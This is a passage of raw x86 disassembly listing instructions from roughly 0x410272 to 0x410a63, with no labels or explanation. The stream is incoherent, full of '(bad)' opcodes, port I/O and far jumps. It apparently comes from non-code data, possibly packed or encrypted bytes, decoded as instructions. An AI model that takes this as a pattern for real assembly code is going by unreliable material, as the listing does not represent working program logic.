  410272:	xor    DWORD PTR [ebx+0x4a],ecx
  410275:	push   esp
  410276:	xor    al,0x73
  410278:	sbb    dh,BYTE PTR [edx+0x6b844535]
  41027e:	mov    esp,0x996f3dd6
  410283:	xor    DWORD PTR [eax],ecx
  410285:	out    dx,eax
  410286:	xor    dl,ch
  410288:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410289:	jl     0x4102d4
  41028b:	in     al,dx
  41028c:	dec    ebx
  41028d:	adc    al,0x53
  41028f:	mov    esi,0x9d1fc1ad
  410294:	mov    eax,cs
  410296:	xor    eax,0x56a298e0
  41029b:	pop    esp
  41029c:	test   eax,0x8584e2ad
  4102a1:	mov    ch,0xc8
  4102a3:	in     eax,dx
  4102a4:	test   al,0x12
  4102a6:	push   cs
  4102a7:	aad    0xaf
  4102a9:	inc    ecx
  4102aa:	mov    bl,0x76
  4102ac:	arpl   sp,si
  4102ae:	rcr    DWORD PTR [edx],cl
  4102b0:	mov    ds:0x87f4baf9,eax
  4102b5:	mov    al,BYTE PTR [esi-0x534c5ab0]
  4102bb:	mov    edx,0xd9e8661c
  4102c0:	aam    0xa8
  4102c2:	and    ch,bh
  4102c4:	jecxz  0x4102e9
  4102c6:	jae    0x410250
  4102c8:	(bad)  
  4102c9:	fsub   QWORD PTR [eax-0x23bd65b5]
  4102cf:	xor    eax,0xb4296c53
  4102d4:	lods   al,BYTE PTR ds:[esi]
  4102d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102d6:	repnz push esi
  4102d8:	pop    ebx
  4102d9:	inc    esi
  4102da:	sub    DWORD PTR [esp+ebx*2+0x8],ebx
  4102de:	clc    
  4102df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102e0:	imul   edx,DWORD PTR [edi],0x28
  4102e3:	add    ah,BYTE PTR [edx]
  4102e5:	aaa    
  4102e6:	pop    ecx
  4102e7:	scas   al,BYTE PTR es:[edi]
  4102e8:	sub    BYTE PTR [ebx+0x30],bl
  4102eb:	ins    BYTE PTR es:[edi],dx
  4102ec:	dec    esp
  4102ed:	push   cs
  4102ee:	call   0x2588fc3f
  4102f3:	sbb    BYTE PTR [edi-0x1c],dl
  4102f6:	mov    esp,0xb04e98f7
  4102fb:	or     DWORD PTR [eax],esi
  4102fd:	push   esi
  4102fe:	stos   DWORD PTR es:[edi],eax
  4102ff:	loope  0x4102c5
  410301:	jno    0x4102ea
  410303:	enter  0x1b68,0x4e
  410307:	retf   0xf56b
  41030a:	outs   dx,DWORD PTR ds:[esi]
  41030b:	dec    edx
  41030c:	shl    ebx,0x3c
  41030f:	sbb    cl,BYTE PTR ds:0x45c0fd6d
  410315:	rcl    esp,cl
  410317:	sub    al,0xc
  410319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41031a:	idiv   DWORD PTR [edx+edi*8+0x4fb5d16c]
  410321:	lods   eax,DWORD PTR ds:[esi]
  410322:	test   BYTE PTR [edx],bh
  410324:	push   edi
  410325:	(bad)  
  410326:	popa   
  410327:	xchg   esi,eax
  410328:	call   DWORD PTR [edi]
  41032a:	ins    BYTE PTR es:[edi],dx
  41032b:	gs mov cl,0x17
  41032e:	and    dh,BYTE PTR [edx]
  410330:	in     al,0x16
  410332:	sbb    al,BYTE PTR [esi-0x4]
  410335:	push   esp
  410336:	mov    ebx,0x5b90b27d
  41033b:	sub    ch,dl
  41033d:	cdq    
  41033e:	pop    edx
  41033f:	js     0x410379
  410341:	arpl   WORD PTR [edi-0x2e34df2d],cx
  410347:	jmp    DWORD PTR [esi]
  410349:	arpl   cx,si
  41034b:	jnp    0x4103a4
  41034d:	sub    dl,BYTE PTR [edx]
  41034f:	jg     0x4102e0
  410351:	aaa    
  410352:	in     eax,dx
  410353:	inc    edx
  410354:	mov    edx,0xb2690ada
  410359:	rcr    DWORD PTR [edx],1
  41035b:	xor    eax,0x4abd855d
  410360:	sahf   
  410361:	mov    edi,0x1d22a240
  410366:	int3   
  410367:	jle    0x410307
  410369:	xor    al,0x0
  41036b:	les    esp,FWORD PTR [esi-0x7adae70e]
  410371:	xchg   DWORD PTR [edx*2+0x6c6a1200],esi
  410378:	adc    eax,0xcc3c5aad
  41037d:	adc    BYTE PTR [eax-0x3b6afba8],ah
  410383:	not    BYTE PTR [ebp+0x66]
  410386:	ret    
  410387:	inc    edx
  410388:	daa    
  410389:	les    edi,FWORD PTR [esi+esi*1]
  41038c:	mov    bl,0x46
  41038e:	mov    ch,0x4d
  410390:	arpl   WORD PTR ds:0x21e3a10c,cx
  410396:	jno    0x4103d1
  410398:	pop    ds
  410399:	sub    al,0xa3
  41039b:	arpl   WORD PTR [eax+ebp*2+0x6b5206d0],ax
  4103a2:	mov    ebx,0x3162a797
  4103a7:	in     al,dx
  4103a8:	test   BYTE PTR [eax+0x232713f3],dh
  4103ae:	sub    edi,DWORD PTR ds:0xc69a96c5
  4103b4:	jle    0x410419
  4103b6:	loop   0x410388
  4103b8:	jmp    0x63e8:0xa7075da5
  4103bf:	jg     0x410420
  4103c1:	sbb    al,0xfa
  4103c3:	dec    ebx
  4103c4:	push   edx
  4103c5:	mov    ebx,0x242a7f29
  4103ca:	mov    DWORD PTR [esi+edx*2+0x6d0105c6],ebp
  4103d1:	(bad)  
  4103d2:	cld    
  4103d3:	outs   dx,DWORD PTR ds:[esi]
  4103d4:	push   0x80cc57ae
  4103d9:	outs   dx,BYTE PTR ds:[esi]
  4103da:	(bad)  
  4103db:	jg     0x410429
  4103dd:	call   0xc9c77f27
  4103e2:	dec    edi
  4103e3:	mov    dl,0x65
  4103e6:	or     ecx,DWORD PTR [edi-0x27]
  4103e9:	pop    esp
  4103ea:	or     al,0xcc
  4103ec:	mov    eax,0x33098a74
  4103f1:	in     eax,0xe2
  4103f3:	cmp    BYTE PTR [ecx+eax*8+0x1],dl
  4103f7:	lods   eax,DWORD PTR ds:[esi]
  4103f8:	and    eax,0x55b98d1
  4103fd:	fsub   DWORD PTR [ecx+0x71]
  410400:	jae    0x41040d
  410402:	sbb    dh,bl
  410404:	ror    cl,cl
  410406:	shr    DWORD PTR [edx+0x75a23752],0xc0
  41040d:	scas   al,BYTE PTR es:[edi]
  41040e:	outs   dx,BYTE PTR ds:[esi]
  41040f:	scas   al,BYTE PTR es:[edi]
  410410:	dec    BYTE PTR [esi+0x7be22ef7]
  410416:	iret   
  410417:	dec    esp
  410418:	adc    eax,0xa631c1db
  41041d:	into   
  41041e:	shl    ecx,0x94
  410421:	out    dx,al
  410422:	mov    esp,0x468a43d4
  410427:	push   0x69266343
  41042c:	ss (bad) 
  41042e:	push   edx
  41042f:	add    al,0x71
  410431:	xchg   BYTE PTR [edx*2+0x483228b3],ch
  410438:	outs   dx,DWORD PTR ds:[esi]
  410439:	adc    al,cl
  41043b:	jnp    0x41048d
  41043d:	mov    ch,BYTE PTR [ecx]
  41043f:	cmc    
  410440:	inc    edi
  410441:	or     BYTE PTR [edi],ch
  410443:	pop    esi
  410444:	mov    eax,0xa3d170db
  410449:	xchg   DWORD PTR [eax-0x26db9d40],esp
  41044f:	add    al,0xe0
  410451:	inc    esi
  410452:	mov    ebx,0x9201bcca
  410457:	cmp    edx,edi
  410459:	or     al,0x11
  41045b:	dec    ebp
  41045c:	ror    DWORD PTR [esi],1
  41045e:	adc    DWORD PTR [eax+ebp*2-0x21936069],ebx
  410465:	cmp    bh,BYTE PTR [esi-0x1e]
  410468:	(bad)  
  410469:	mov    ecx,0xd7f9d896
  41046e:	mov    eax,0x2a715c6d
  410473:	fidiv  WORD PTR [ecx-0x7f]
  410476:	or     eax,DWORD PTR [ebx+0x69a5b47c]
  41047c:	adc    ecx,DWORD PTR es:[edx]
  41047f:	or     BYTE PTR [ebx+0x30a9d613],dh
  410485:	sbb    eax,0x554a881d
  41048a:	js     0x41048f
  41048c:	ja     0x41043e
  41048e:	call   0x203e:0x51bbbf91
  410495:	jb     0x410508
  410497:	cmc    
  410498:	fisubr DWORD PTR [ecx]
  41049a:	jg     0x4104b5
  41049c:	mov    ds:0x1dee7753,al
  4104a1:	fld    TBYTE PTR [ebx-0x5d]
  4104a4:	mov    edx,0x947082aa
  4104a9:	stos   DWORD PTR es:[edi],eax
  4104aa:	sti    
  4104ab:	pop    esi
  4104ac:	out    dx,eax
  4104ad:	cmp    DWORD PTR [ebx+0x64bfee7d],ebx
  4104b3:	mov    cl,0xbe
  4104b5:	add    eax,0x914ccb
  4104ba:	repnz adc edx,eax
  4104bd:	xor    DWORD PTR [si-0x78],ebp
  4104c1:	mov    ecx,DWORD PTR [edi-0x112bf0e4]
  4104c7:	push   ebp
  4104c8:	sbb    eax,0xd84e33ab
  4104cd:	mov    eax,0x667b5f73
  4104d2:	js     0x4104bf
  4104d4:	fisubr DWORD PTR [esi-0x77bd3cf4]
  4104da:	push   cs
  4104db:	int3   
  4104dc:	xor    al,0xab
  4104de:	cdq    
  4104df:	lods   eax,DWORD PTR ds:[esi]
  4104e0:	jne    0x410511
  4104e2:	xchg   ebp,eax
  4104e3:	inc    eax
  4104e4:	or     BYTE PTR [ecx+eax*4+0x68],dh
  4104e8:	cli    
  4104e9:	fdiv   DWORD PTR [edx-0x1]
  4104ec:	out    0x68,eax
  4104ee:	xlat   BYTE PTR ds:[ebx]
  4104ef:	inc    esi
  4104f0:	jl     0x4104fd
  4104f2:	xor    eax,0x350015fc
  4104f7:	cmp    ah,BYTE PTR [ecx+0xa]
  4104fa:	sbb    eax,0xf210dafa
  4104ff:	xacquire xchg BYTE PTR [ecx+0x25],bh
  410503:	or     eax,0x1dd5a87
  410508:	mov    edx,0x6a412174
  41050d:	mov    eax,ds:0x4e352602
  410512:	pop    ecx
  410513:	jnp    0x41051d
  410515:	stos   BYTE PTR es:[edi],al
  410516:	pop    ebx
  410517:	sub    eax,0x7bed3cc3
  41051c:	push   0x4d917ec4
  410521:	mov    ds:0x59644888,eax
  410526:	inc    esi
  410527:	shr    BYTE PTR [ecx+0x77],cl
  41052a:	fidivr WORD PTR [edi]
  41052c:	add    BYTE PTR [edi],ah
  41052e:	pop    ecx
  41052f:	push   esp
  410530:	mov    edx,ebx
  410532:	inc    esi
  410533:	mov    dh,0x88
  410535:	into   
  410536:	mov    bl,0xe4
  410538:	mov    bl,0x88
  41053a:	bound  ecx,QWORD PTR [eax-0x2eccdeef]
  410540:	and    DWORD PTR [ebx],ebp
  410542:	cmp    BYTE PTR [eax-0x6868b1af],ah
  410548:	jmp    0x41058e
  41054a:	push   edx
  41054b:	jno    0x410591
  41054d:	sbb    al,0xa8
  41054f:	jnp    0x410543
  410551:	cmp    DWORD PTR [edx-0x2a],0x47ce0f89
  410558:	mov    ah,0xfb
  41055a:	(bad)  
  41055b:	int3   
  41055c:	pop    eax
  41055d:	cmp    BYTE PTR [ecx+ebp*8+0x5ff21e8],cl
  410564:	test   eax,0xa91a349
  410569:	sub    edi,esi
  41056b:	loope  0x41058e
  41056d:	fld    TBYTE PTR [ebx]
  41056f:	mov    DWORD PTR [ebx+edx*1],eax
  410572:	add    al,0x64
  410574:	mov    bh,BYTE PTR [edx]
  410576:	push   ds
  410577:	sub    BYTE PTR [edi-0x67f82e97],ch
  41057d:	mov    esp,0x3a64da24
  410582:	sbb    BYTE PTR [ebx+0x2],al
  410585:	xchg   BYTE PTR [edi-0x21d75a72],ah
  41058b:	push   edi
  41058c:	cwde   
  41058d:	add    edi,ecx
  41058f:	mov    ebx,0xb32dfe42
  410594:	and    al,0x78
  410596:	bound  edi,QWORD PTR [ebx-0x15]
  410599:	sti    
  41059a:	jle    0x4105ed
  41059c:	iret   
  41059d:	xchg   edx,eax
  41059e:	mov    edi,0xc56323df
  4105a3:	jg     0x41052b
  4105a5:	shl    cl,0x3a
  4105a8:	test   al,0x29
  4105aa:	hlt    
  4105ab:	sbb    BYTE PTR [edx],dh
  4105ad:	test   BYTE PTR [esi+0xbbd7e64],bh
  4105b3:	test   cl,dh
  4105b5:	pop    ebx
  4105b6:	enter  0x35f6,0x34
  4105ba:	push   0x3e
  4105bc:	push   ebp
  4105bd:	push   eax
  4105be:	or     al,0xe4
  4105c0:	iret   
  4105c1:	sbb    DWORD PTR [ebp-0x55],edi
  4105c4:	jecxz  0x4105e2
  4105c6:	pusha  
  4105c7:	or     esi,edx
  4105c9:	dec    edx
  4105ca:	fnstcw WORD PTR [eax+0x20]
  4105cd:	and    cl,ch
  4105cf:	and    DWORD PTR [edi-0x443563f8],ecx
  4105d5:	push   eax
  4105d6:	inc    edi
  4105d7:	addr16 mov ecx,0xc7d1942
  4105dd:	inc    eax
  4105de:	mov    ah,0x4e
  4105e0:	mov    ds:0xf971a28e,al
  4105e5:	aam    0x8f
  4105e7:	sbb    DWORD PTR [ebx+0x44f9f857],esi
  4105ed:	js     0x4105af
  4105ef:	inc    ecx
  4105f0:	fdivr  DWORD PTR [ecx-0x53]
  4105f3:	aam    0x99
  4105f5:	cmp    al,0xcc
  4105f7:	jl     0x41059a
  4105f9:	cdq    
  4105fa:	std    
  4105fb:	push   edi
  4105fc:	mov    ah,0x97
  4105fe:	xor    edi,0xe
  410601:	sbb    DWORD PTR [ebx+eiz*4-0x4a88246e],eax
  410608:	hlt    
  410609:	dec    ebp
  41060a:	std    
  41060b:	jo     0x4105d2
  41060d:	cmp    BYTE PTR fs:[esi-0x17],0x49
  410612:	test   eax,0xeb85ce79
  410617:	jp     0x41068d
  410619:	push   edx
  41061a:	call   0x3548d6ed
  41061f:	push   es
  410620:	sbb    esi,DWORD PTR [ecx-0x6d]
  410623:	adc    al,0x85
  410625:	repz out dx,eax
  410627:	pop    ebx
  410628:	sub    BYTE PTR [edx],bh
  41062a:	inc    eax
  41062b:	(bad)  
  41062c:	jns    0x410642
  41062e:	std    
  41062f:	mov    bl,0xcc
  410631:	inc    esp
  410632:	and    ebx,DWORD PTR [esi+0x5]
  410635:	xor    edi,DWORD PTR [edi+0x5228879a]
  41063b:	das    
  41063c:	neg    BYTE PTR [edi]
  41063e:	sub    al,0xae
  410640:	xchg   edx,eax
  410641:	push   ebx
  410642:	sub    eax,0x6b17fa5e
  410647:	or     cl,BYTE PTR [edx-0x2a4d1a70]
  41064d:	repnz (bad) 
  41064f:	rcr    BYTE PTR [ebp+0x31],cl
  410652:	repz ds aam 0x2b
  410656:	mov    ds:0x22809ec9,eax
  41065b:	add    edi,DWORD PTR [eax]
  41065d:	adc    DWORD PTR ds:0x1e09a3eb,ecx
  410663:	popf   
  410664:	call   0x34fa:0xc7265346
  41066b:	dec    esp
  41066c:	in     eax,0x4e
  41066e:	jbe    0x410661
  410670:	test   BYTE PTR [ecx+0x5b8b84dd],ah
  410676:	xchg   edx,eax
  410677:	daa    
  410678:	je     0x41063a
  41067a:	sbb    al,al
  41067c:	adc    BYTE PTR [ecx],0x69
  41067f:	cmc    
  410680:	sbb    ch,BYTE PTR [ebx+esi*1]
  410683:	push   0xf3e72985
  410688:	in     al,0x9a
  41068a:	pop    ebp
  41068b:	pop    ds
  41068c:	sbb    esi,ecx
  41068e:	loop   0x41062a
  410690:	inc    ebp
  410691:	or     ebp,DWORD PTR [ebp+0x6a]
  410694:	fist   WORD PTR [edi+0x22]
  410697:	sub    al,0xf6
  410699:	lds    esp,FWORD PTR [ecx+0x5c1a2e30]
  41069f:	iret   
  4106a0:	mov    edx,DWORD PTR [edi+0x28e7c486]
  4106a6:	mov    dh,0x25
  4106a8:	cmp    eax,0x6c3596c7
  4106ad:	mov    esp,0x7b16c802
  4106b2:	imul   DWORD PTR [eax-0x28d5ea4d]
  4106b8:	lahf   
  4106b9:	repnz stos DWORD PTR es:[edi],eax
  4106bb:	sbb    esi,DWORD PTR [ebx+edi*4]
  4106be:	and    ah,bh
  4106c0:	jo     0x41071f
  4106c2:	add    BYTE PTR [ecx+0x1cbeecb4],ch
  4106c8:	dec    edi
  4106c9:	das    
  4106ca:	or     al,0x45
  4106cc:	sub    ecx,DWORD PTR [eax-0x17]
  4106cf:	pop    esi
  4106d0:	and    BYTE PTR [edx+0x77194460],cl
  4106d6:	sub    al,0xee
  4106d8:	xchg   ebp,eax
  4106d9:	(bad)  [ebx]
  4106db:	or     ebp,edi
  4106dd:	dec    cl
  4106df:	sbb    al,0x9a
  4106e1:	sbb    BYTE PTR [eax+0x12382873],dl
  4106e7:	jmp    0x4106eb
  4106e9:	cmp    al,0x1f
  4106eb:	pop    ss
  4106ec:	mov    edi,0xd3d1b76c
  4106f1:	inc    ebx
  4106f2:	cmp    ebx,DWORD PTR [ebx+edi*1]
  4106f5:	ror    ch,1
  4106f7:	pop    edx
  4106f8:	inc    edx
  4106f9:	aaa    
  4106fa:	adc    eax,0x8c27505d
  4106ff:	cmc    
  410700:	or     eax,0x237892c0
  410705:	into   
  410706:	aaa    
  410707:	mov    eax,DWORD PTR [ebx]
  410709:	mov    BYTE PTR [ecx-0x74],0x6c
  41070d:	adc    eax,DWORD PTR [ebp-0x3a5b2975]
  410713:	rcl    BYTE PTR [edi+0x16097f03],0xc7
  41071a:	retf   0xa192
  41071d:	cwde   
  41071e:	outs   dx,BYTE PTR ds:[esi]
  41071f:	mov    ds:0xcb70a2a1,eax
  410724:	iret   
  410725:	fisttp WORD PTR [esi-0x423e9d26]
  41072b:	in     al,0x68
  41072d:	xchg   dl,cl
  41072f:	shl    DWORD PTR [ebp-0x76cc5dc],0xd0
  410736:	mov    ebx,0xad660b65
  41073b:	inc    edx
  41073c:	mov    ebx,DWORD PTR [ebx+eiz*4+0x5ab396c3]
  410743:	xor    DWORD PTR es:[ebx],edx
  410746:	or     DWORD PTR [ebp+esi*8+0x7c],ebx
  41074a:	push   edi
  41074b:	loop   0x41071a
  41074d:	mov    al,ds:0x7a13fa5
  410752:	std    
  410753:	shl    BYTE PTR [edi],cl
  410755:	jo     0x41071f
  410757:	jp     0x4107c6
  410759:	push   esp
  41075a:	(bad)  
  41075b:	push   ebp
  41075c:	dec    edx
  41075d:	mov    ebp,0x37e577dc
  410762:	test   DWORD PTR [edx],esp
  410764:	je     0x410786
  410766:	enter  0x4d82,0xd6
  41076a:	hlt    
  41076b:	(bad)  
  41076d:	cmp    cl,BYTE PTR ds:0xcbadeb0b
  410773:	add    bl,al
  410775:	push   edi
  410776:	mov    al,ds:0x7b0d736a
  41077b:	inc    ecx
  41077c:	add    DWORD PTR [edx],eax
  41077e:	mov    ebx,0xb0c37b11
  410783:	shl    ecx,cl
  410785:	sub    al,0x8a
  410787:	and    BYTE PTR [edx],bh
  410789:	loopne 0x410805
  41078b:	call   0x6f46:0x33aec263
  410792:	and    bl,BYTE PTR [edx+ebp*4-0x13ca6b7b]
  410799:	stc    
  41079a:	inc    ebp
  41079b:	cs push ss
  41079d:	xor    eax,DWORD PTR [eax+0x52]
  4107a0:	enter  0x1e0e,0x62
  4107a4:	enter  0xa68,0x95
  4107a8:	scas   eax,DWORD PTR es:[edi]
  4107a9:	sub    DWORD PTR [esi],edx
  4107ab:	dec    ebp
  4107ac:	enter  0x8ca1,0x54
  4107b0:	push   ds
  4107b1:	push   0xb91ea2c0
  4107b6:	imul   esp,DWORD PTR [esp+eax*4],0x79
  4107ba:	inc    edx
  4107bb:	cmp    dh,dl
  4107bd:	mov    edx,0x1c8bdd85
  4107c2:	sub    bl,BYTE PTR [ecx+0x2f]
  4107c5:	pop    es
  4107c6:	add    eax,0xe9491ac6
  4107cb:	lahf   
  4107cc:	iret   
  4107cd:	mov    ch,0xc8
  4107cf:	(bad)  
  4107d0:	int    0xee
  4107d2:	pushf  
  4107d3:	and    DWORD PTR [ebx],0x509dc9e7
  4107d9:	enter  0xfd9f,0xb6
  4107dd:	pusha  
  4107de:	(bad)  
  4107df:	xchg   esi,eax
  4107e0:	sub    dl,dh
  4107e2:	outs   dx,DWORD PTR ds:[esi]
  4107e3:	popa   
  4107e4:	mov    ebp,0x9bfbc3f7
  4107e9:	and    ebx,DWORD PTR [edi+eax*8+0x5ad49853]
  4107f0:	cmp    DWORD PTR [esp+eax*4+0x4114de1b],eax
  4107f7:	lds    ebx,FWORD PTR [edi]
  4107f9:	cmp    eax,0xdbe065ce
  4107fe:	ficom  WORD PTR [ebx+0x63]
  410801:	mov    edi,0x209dfe41
  410806:	pop    esi
  410807:	(bad)  
  410808:	xchg   edi,eax
  410809:	jl     0x4107d8
  41080b:	lods   eax,DWORD PTR ds:[esi]
  41080c:	retf   
  41080d:	ror    BYTE PTR [edi-0x24d64988],0xde
  410814:	jl     0x410836
  410816:	aas    
  410817:	aam    0xed
  410819:	(bad)  
  41081a:	gs sahf 
  41081c:	rcr    BYTE PTR [ecx],1
  41081e:	nop
  41081f:	(bad)  
  410820:	clc    
  410821:	aaa    
  410822:	and    al,0xcf
  410824:	inc    DWORD PTR [ebx+edx*8]
  410827:	mov    BYTE PTR [eax],dh
  410829:	hlt    
  41082a:	outs   dx,BYTE PTR ds:[esi]
  41082b:	or     al,0x69
  41082d:	pop    ebp
  41082e:	ins    DWORD PTR es:[edi],dx
  41082f:	aas    
  410830:	sbb    bl,BYTE PTR [esi+0x76]
  410833:	out    dx,eax
  410834:	retf   0xff11
  410837:	and    dl,al
  410839:	imul   edi,DWORD PTR [eax],0x8
  41083c:	mov    bl,0xdf
  41083e:	add    edx,edi
  410840:	dec    eax
  410841:	inc    esp
  410842:	adc    BYTE PTR [ebx-0x502034d5],bh
  410848:	call   0x7a606bf
  41084d:	push   edi
  41084e:	out    0x40,eax
  410850:	rol    esi,0x73
  410853:	lods   eax,DWORD PTR fs:[esi]
  410855:	adc    ecx,DWORD PTR [esi]
  410857:	sub    al,0x88
  410859:	push   edx
  41085a:	stc    
  41085b:	scas   eax,DWORD PTR es:[edi]
  41085c:	inc    esi
  41085d:	imul   edi,DWORD PTR [ebx+0x32e4d6a1],0x10d43c1b
  410867:	mov    esp,0xabb928ec
  41086c:	icebp  
  41086d:	(bad)  
  41086f:	lahf   
  410870:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410871:	ins    BYTE PTR es:[edi],dx
  410872:	cdq    
  410873:	mov    ah,0x77
  410875:	push   cs
  410876:	ins    DWORD PTR es:[edi],dx
  410877:	enter  0xa5fe,0x9d
  41087b:	xor    eax,0xb52e67c
  410880:	pop    ss
  410881:	sub    ah,0xf2
  410884:	fimul  DWORD PTR [edx-0x496688e]
  41088a:	pushf  
  41088b:	lahf   
  41088c:	inc    DWORD PTR [ecx+0x4]
  41088f:	mov    esp,0x54053dcb
  410894:	dec    esi
  410895:	(bad)  
  410896:	out    0x4c,eax
  410898:	or     edx,DWORD PTR [ebx-0x23]
  41089b:	xchg   esp,eax
  41089c:	sub    DWORD PTR [edi+eiz*8-0x1e],edi
  4108a0:	fbld   TBYTE PTR [ebx+0x25]
  4108a3:	in     eax,dx
  4108a4:	rcr    DWORD PTR [ecx-0x27a90c58],cl
  4108aa:	in     al,0x4a
  4108ac:	stos   DWORD PTR es:[edi],eax
  4108ad:	xor    ecx,0xffffffc5
  4108b0:	xchg   ebp,eax
  4108b1:	adc    al,0x7e
  4108b3:	dec    ecx
  4108b5:	xchg   edi,eax
  4108b6:	out    0x31,eax
  4108b8:	lods   al,BYTE PTR ss:[esi]
  4108ba:	add    bh,bh
  4108bc:	ss loopne 0x41089a
  4108bf:	lods   al,BYTE PTR ds:[esi]
  4108c0:	cdq    
  4108c1:	push   eax
  4108c2:	aad    0xb0
  4108c4:	loope  0x4108d6
  4108c6:	icebp  
  4108c7:	dec    eax
  4108c8:	pop    esi
  4108c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108ca:	ins    BYTE PTR es:[edi],dx
  4108cb:	xchg   esp,eax
  4108cc:	retf   0x446e
  4108cf:	js     0x4108b7
  4108d1:	sbb    bl,BYTE PTR [ebx-0x13f5e14a]
  4108d7:	addr16 std 
  4108d9:	sub    dl,BYTE PTR [esp+ebp*2-0x7b]
  4108dd:	sbb    eax,0xcc0c577c
  4108e2:	and    al,0xf6
  4108e4:	and    al,0x60
  4108e6:	xchg   ebp,eax
  4108e7:	xchg   ecx,eax
  4108e8:	sar    BYTE PTR [ebx-0x8e5e389],0xe3
  4108ef:	sub    edi,DWORD PTR [ecx]
  4108f1:	in     eax,dx
  4108f2:	mov    WORD PTR [ebx+edi*2+0x44bf0043],ds
  4108f9:	ja     0x410944
  4108fb:	test   al,0x77
  4108fd:	jmp    FWORD PTR [eax+0x1a]
  410900:	pop    esp
  410901:	ds pop ds
  410903:	ins    DWORD PTR es:[edi],dx
  410904:	push   es
  410905:	push   ecx
  410906:	test   DWORD PTR [ecx],edx
  410908:	(bad)  
  410909:	cmp    DWORD PTR [eax-0x34],edi
  41090c:	jno    0x4108aa
  41090e:	into   
  41090f:	sbb    ebx,DWORD PTR [edi+edx*8-0x79d53b4b]
  410916:	sub    edx,DWORD PTR [edi-0x593d2608]
  41091c:	rcl    DWORD PTR [ebp+0x2e157982],cl
  410922:	out    dx,al
  410923:	pop    edx
  410924:	in     eax,dx
  410925:	pop    es
  410926:	adc    al,0x13
  410928:	cdq    
  410929:	ins    BYTE PTR es:[edi],dx
  41092a:	mov    bl,0x94
  41092c:	adc    ah,bh
  41092e:	bound  edi,QWORD PTR [esi]
  410930:	mov    edi,0xe5d80eb4
  410935:	mov    eax,0x52146a26
  41093a:	dec    esi
  41093b:	scas   eax,DWORD PTR es:[edi]
  41093c:	fisub  WORD PTR [ebp-0x3c]
  41093f:	lods   eax,DWORD PTR ds:[esi]
  410940:	push   cs
  410941:	ss (bad) 
  410944:	xchg   edi,eax
  410945:	ss aam 0x18
  410948:	loope  0x4108d4
  41094a:	es xchg ecx,eax
  41094c:	fs xchg esi,eax
  41094e:	dec    esp
  41094f:	dec    esp
  410950:	aad    0xd7
  410952:	inc    esi
  410953:	mov    ds:0x27dc1316,eax
  410958:	ja     0x41091e
  41095a:	mov    al,ds:0x109e8dd3
  41095f:	adc    DWORD PTR [edx+0x1bf67a0d],edi
  410965:	lea    esi,[eax-0x3a]
  410968:	(bad)  
  410969:	nop
  41096a:	ins    DWORD PTR es:[edi],dx
  41096b:	pop    ebp
  41096c:	rol    BYTE PTR [ebp-0x22],1
  41096f:	std    
  410970:	xor    al,BYTE PTR [edi+0x527c2c05]
  410976:	dec    ebx
  410977:	and    ah,BYTE PTR [eax+0x78]
  41097a:	popa   
  41097b:	sbb    eax,0xa7c252c6
  410980:	imul   ecx,DWORD PTR [esi-0x67842dc8],0x11c2fcaf
  41098a:	jg     0x4109d5
  41098c:	add    ecx,esi
  41098e:	dec    ebx
  41098f:	push   cs
  410990:	mov    edi,0x4def35d2
  410995:	scas   eax,DWORD PTR es:[edi]
  410996:	scas   eax,DWORD PTR es:[edi]
  410997:	ss (bad) 
  410999:	mov    ds,WORD PTR [ecx]
  41099b:	in     eax,0x40
  41099d:	sub    eax,0x91d6dd3a
  4109a2:	jle    0x41099a
  4109a4:	pop    ecx
  4109a5:	fist   WORD PTR [ebx-0xb68f10e]
  4109ab:	vmovss xmm0,xmm5,xmm7
  4109af:	shl    DWORD PTR [eax],0x7
  4109b2:	repnz in al,0x53
  4109b5:	mov    bl,BYTE PTR [ebx]
  4109b7:	add    bh,bl
  4109b9:	mov    dh,0xd0
  4109bb:	popa   
  4109bc:	or     eax,0x22e54119
  4109c1:	lock jo 0x4109e6
  4109c4:	mov    eax,0xb3799635
  4109c9:	imul   ebp,DWORD PTR [eax-0x7a11dadf],0xd1e3944
  4109d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109d4:	xchg   edx,eax
  4109d5:	and    ah,BYTE PTR [esi+0x24]
  4109d8:	xchg   ebp,eax
  4109d9:	jae    0x41095d
  4109db:	jmp    0xa8eb:0x4cb5ddf1
  4109e2:	jge    0x410a21
  4109e4:	or     DWORD PTR [ebp-0x5b],eax
  4109e7:	cmp    ebx,DWORD PTR [edi-0x6340773c]
  4109ed:	push   esp
  4109ee:	dec    esi
  4109ef:	sbb    al,0x6a
  4109f1:	xor    al,dl
  4109f3:	dec    ebx
  4109f4:	sti    
  4109f5:	outs   dx,DWORD PTR ds:[esi]
  4109f6:	cdq    
  4109f7:	stos   BYTE PTR es:[edi],al
  4109f8:	sti    
  4109f9:	aas    
  4109fa:	(bad)  
  4109fb:	mov    cl,0x64
  4109fd:	pop    ds
  4109fe:	mov    dl,0x51
  410a00:	cmp    edi,eax
  410a02:	test   eax,0x50c10b13
  410a07:	cwde   
  410a08:	push   0x17
  410a0a:	call   0x6e17:0x5f719300
  410a11:	jb     0x410a2f
  410a13:	or     al,0x60
  410a15:	add    bl,BYTE PTR [eax+eiz*2]
  410a18:	addr16 repz out 0x9d,al
  410a1c:	(bad)  
  410a1d:	(bad)  
  410a1e:	mov    ebp,DWORD PTR [esi]
  410a20:	test   BYTE PTR [eax+0x37],ah
  410a23:	dec    BYTE PTR [edi+0x137cc198]
  410a29:	cmp    eax,0x424cee6c
  410a2e:	cmp    al,0xf1
  410a30:	add    al,0xd8
  410a32:	sbb    al,bl
  410a34:	xor    al,ch
  410a36:	mov    al,0xd5
  410a38:	sub    DWORD PTR [ecx-0x5c],esi
  410a3b:	test   al,0x77
  410a3d:	int3   
  410a3e:	and    ebp,eax
  410a40:	not    BYTE PTR [esi-0x219c9d54]
  410a46:	shl    DWORD PTR [edx-0x35],cl
  410a49:	out    0x1a,al
  410a4b:	mov    ebx,0xbeded8ae
  410a50:	mov    al,ds:0x14e84d2f
  410a55:	and    al,0xdf
  410a57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a58:	(bad)  
  410a59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a5a:	mov    al,ds:0x6c62613f
  410a5f:	pop    edi
  410a60:	push   edx
  410a61:	adc    al,0x71
  410a63:	into   
